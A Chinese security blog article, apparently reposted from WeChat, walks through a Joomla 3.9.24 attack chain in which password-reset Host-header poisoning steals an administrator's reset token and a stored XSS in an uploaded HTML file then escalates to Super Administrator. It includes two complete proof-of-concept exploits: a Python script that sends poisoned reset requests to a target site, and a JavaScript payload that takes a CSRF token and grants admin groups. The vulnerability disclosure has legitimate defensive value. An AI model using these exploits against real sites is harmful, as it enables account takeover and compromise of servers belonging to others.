> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VY63mYqtCKpZ0uIb8XjiOg)

![](https://mmbiz.qpic.cn/mmbiz_png/OhKLyqyFoP9mJwX65uY3o0wwuMo2eWPeFuDIhxJlAjMcIicKFSYLVZ6fjicY0dNle24gfmiaVpwCcP2PeZuZyaRzw/640?wx_fmt=png)点击上方蓝字关注我们

Joomla 是全球最受欢迎的开源 CMS 之一，安装量超过 150 万。安全研究人员发现 Joomla 3.9.24 中存在密码重置漏洞和存储型 XSS 漏洞。攻击者可以组合利用这两个漏洞，以实现对底层服务器的完全破坏。

Joomla 密码重置漏洞


-----------------

Joomla 中有两个有趣的用户角色，一个是 “管理员”，另一个是 “超级管理员”。显然，我们最终想要拿下的是 “超级管理员” 的帐号密码，但要达到这一目标还需要几个步骤。我们的目标之一是密码重置功能。

Joomla 开发人员完全删除了 “超级管理员” 的密码重置功能。但是，我们仍然可以为不是 “超级管理员” 的任何其他用户重置密码。因此，我们可以先以普通 “管理员” 为目标。首先使用 Burp 进行快速扫描，并没有发现任何东西。所以，我们开始进行代码审查。密码重置进程在 reset.php 模型中开始：

```
$link = 'index.php?option=com_users&view=reset&layout=confirm&token=' . $token;

// Put together the email template data.
$data = $user->getProperties();
$data['fromname'] = $config->get('fromname');
$data['mailfrom'] = $config->get('mailfrom');
$data['sitename'] = $config->get('sitename');
$data['link_text'] = JRoute::_($link, false, $mode);
$data['link_html'] = JRoute::_($link, true, $mode);
$data['token'] = $token;
```

我们需要深入挖掘并检查域名是如何被添加到重置链接的。以下是 URI.php 中的代码：

```
if (!empty($_SERVER['PHP_SELF']) && !empty($_SERVER['REQUEST_URI']))
{
  // To build the entire URI we need to prepend the protocol, and the http host
  // to the URI string.
   $theURI = 'http' . $https . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
}
```

可以发现密码重置链接是在 URI.php 中使用 HOST 头创建的，因此容易受到 HOST 头攻击。让我们用 Repeater 检测下是否真的存在 HOST 头攻击漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakbUMricFEgzAmoGbcaH9icRic8ReXJ6D9YRmjFSX9QIdJnmpJKXCo5DxygAfC6lN6vD7TMNZxCYNcuuA/640?wx_fmt=png)

几分钟后，我在收件箱中成功的收到了密码重置的电子邮件，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakbUMricFEgzAmoGbcaH9icRic8IDNSmK3XPVXFDKEAVuwMuhbsYzAGcrplBLiao46PLgKFpAicZjoicJJTA/640?wx_fmt=png)

如你所见主机是由攻击者控制的，受害者会被重定向到恶意服务器，该服务器将收集密码重置令牌并设置新密码。一旦毫无戒心的用户点击链接，你将可以获得管理员的重置令牌并重置他的密码。

**PoC 概念验证：**

```
#!/usr/bin/python

import requests
import sys
import re
import argparse
import random


def extract_csrf_token(resp):
  match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
  if match is None:
    print("[!] Cannot find CSRF token")
    return None
  return match.group(1)


def parse_options():
  parser = argparse.ArgumentParser(description='Jooma Admin Password Poisoning Exploit')
  parser.add_argument('-u','--url', help='Target joomla url')
  parser.add_argument('-e', '--email', default='Admin\'s email address')
  parser.add_argument('-p', '--poison', default='Poisoning host')
  return parser.parse_args()

def print_header():
  clear = "\x1b[0m"
  colors = [31, 32, 33, 34, 35, 36]

  logo = """                                                                                                                    
Joomla password reset poisoning - Fortbridge @2021
"""
  for line in logo.split("\n"):
    sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
    #time.sleep(0.05)

def main(argv):  
  print_header()
  options = parse_options()
  sess = requests.Session()
  #Burp Suite Testing
  #proxy = {  "http"  : "http://127.0.0.1:8080", "https"  : "http://127.0.0.1:8080" } # 
  #proxy = {}
  print("[+] You've setup the token logger, right?")
  print("[+] Getting the CSRF token")
  resp = sess.get(options.url)#, proxies= proxy)  
  token = extract_csrf_token(resp)
  print("[+] Got CSRF token", token)
  print("[+] Sending poisoned password reset request")
  data = { "jform[email]": options.email,
    token: '1'
  }
  sess.headers["Host"]=options.poison

  #We need to bypass the CookieJar rules from the Session() module when we set the Host header explicitly
  #Shut up, python, I know what I'm doing.
  sess_value = list(sess.cookies.get_dict().values())[0];
  sess_key = list(sess.cookies.get_dict().keys())[0];
  sess.headers["Cookie"]= sess_key +'='+sess_value
  
  resp = sess.post(options.url + '/index.php?option=com_users&task=reset.request&Itemid=104', data=data)#, proxies= proxy )
  if "Your session has expired. Please log in again" in resp.text:
       print ("[+]Session expired, try again")
  elif 'An email has been sent to your email address' in resp.text:
         print('[+] Admin Reset Link poisoned, fingers crossed now!')     
  elif 'You have exceeded the maximum number of password resets allowed. Please try again in one hour' in resp.text:
         print('[+] You have exceeded the maximum number of password resets allowed. Please try again in one hour')
  else:
       print("Some other error occured")
  print("[+] Use exploit cve-2021-xxxx to escalate to SuperAdmin! ")
  #print(resp.text)

if __name__ == "__main__":
    if len(sys.argv) == 7:
      sys.exit(main(sys.argv))
    else:
      print("Usage: python3 "+sys.argv[0]+" -u target_url -e admin_email -p poison_host")
```

通过存储型 XSS 漏洞提升权限


--------------------

我们的最终目标是 “超级管理员”，因此下一步要做的是权限提升。新目标是上传媒体功能，我们使用了多种攻击手段来上传 php 文件，但并没有成功。通过检查，发现源代码中会对文件名、扩展名、文件内容等进行一些可靠的验证。

但在寻找可以滥用的功能时，我们发现 “管理员” 用户拥有禁用某些上传限制的权限。且 Joomla 开发人员使用了允许上传的硬编码扩展白名单。

开发人员并没有将.html 扩展名硬编码在黑名单中。因此，只要拥有普通管理员权限，我们就能够将 “.html” 添加到合法扩展名中，并禁用 “限制上传”，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakbUMricFEgzAmoGbcaH9icRic8f8V5gMNiaqoiaanjbzCaibuLmCia81XAicAcVo0vibNmzZ04qdWo3vCO3kicw/640?wx_fmt=png)

虽然我们尝试将 “php” 扩展名列入白名单的请求被完全忽略了，但我们已经成功将 “.html” 扩展名列入白名单。现在我们可以继续上传一个包含 XSS 有效载荷的 “html” 文件，该文件用于针对 “超级管理员” 用户。

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakbUMricFEgzAmoGbcaH9icRic8fEPVFse5iaGemfW4UuSibyepBWnZicG1wVTccoDRobCib9Qvc7sOJjpPmw/640?wx_fmt=png)

我们可以使用内部消息传递功能将 XSS 有效载荷传递给超级管理员，也可以将链接嵌入网站文章、评论当中。一旦受害者访问该链接，我们就能成功将权限提升为 “超级管理员”。

**PoC 概念验证：**

```
<html>
<body>
<script>
//CVE-2021-26032
var csrf_token="";
//The below 3 variables need to be set 
var user_id=467;            //the id of the user that gets the privileges
var root_dir="/Joomla/";    //the root directory of Joomla setup
var user;       //the username that gets the privileges
getTokenJS();
function getTokenJS() 
{
    var xhr = new XMLHttpRequest();
    xhr.open("GET", root_dir+"/administrator/index.php?option=com_users&view=users", true);
    xhr.onload = function (e) 
    {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) 
        {
            // Get the document from the response
            page = xhr.response
            regex=/\"csrf.token\":\".{32}\"/m;
            result = String(page).match(regex);
            window.csrf_token += String(result).substr(14,32);
            // Show the token
            console.log("The token is: " + window.csrf_token);
            document.write(result);
            //make req. to get privileges
            getSUPrivileges();
        }
    };
    // Make the request
    xhr.send(null);
}
function getSUPrivileges()
{
  console.log("csrf: "+window.csrf_token);
    value="jform%5bname%5d="+username+"&jform%5busername%5d="+username+"&jform%5bpassword%5d=&jform%5bpassword2%5d=&jform%5bemail%5d=admed@gmail.com&jform%5bregisterDate%5d=2021-02-19+07%3a05%3a29&jform%5blastvisitDate%5d=2021-02-25+11%3a15%3a44&jform%5blastResetTime%5d=&jform%5bresetCount%5d=0&jform%5bsendEmail%5d=0&jform%5bblock%5d=0&jform%5brequireReset%5d=0&jform%5bid%5d=467&jform%5bgroups%5d%5b%5d=7&jform%5bgroups%5d%5b%5d=2&jform%5bgroups%5d%5b%5d=4&jform%5bgroups%5d%5b%5d=8&jform%5bparams%5d%5badmin_style%5d=&jform%5bparams%5d%5badmin_language%5d=&jform%5bparams%5d%5blanguage%5d=&jform%5bparams%5d%5beditor%5d=&jform%5bparams%5d%5btimezone%5d=&task=user.apply&"+window.csrf_token+"=1"
    console.log(value);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", root_dir+"/administrator/index.php?option=com_users&layout=edit&id="+user_id, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() 
    {//Call a function when the state changes.
        if(xhr.readyState == 4 && xhr.status == 200) 
        {
            console.log("request done");
        }
    } 
    xhr.send(value);
}
</script>
</body>
</html>
```

![](https://mmbiz.qpic.cn/mmbiz_png/RQoDdorCu0V5znWFiaMBVWiaibdvAvmGeUvfC5LJ60x1Kq5wiaQ5UtMKEDcwQJ3ibicBdGBKxGs1V2AuZcg3ISoDto1g/640?wx_fmt=png)

  

END

  

![](https://mmbiz.qpic.cn/mmbiz_png/DQk5QiaQiciakarCFnYafgYGpNRiaX2oibtiawYX92ytrKp9MpmQeOqARcreRBybBX1fDbv2guZxExicn7f0wn2dkVwqw/640?wx_fmt=png)

好文！必须在看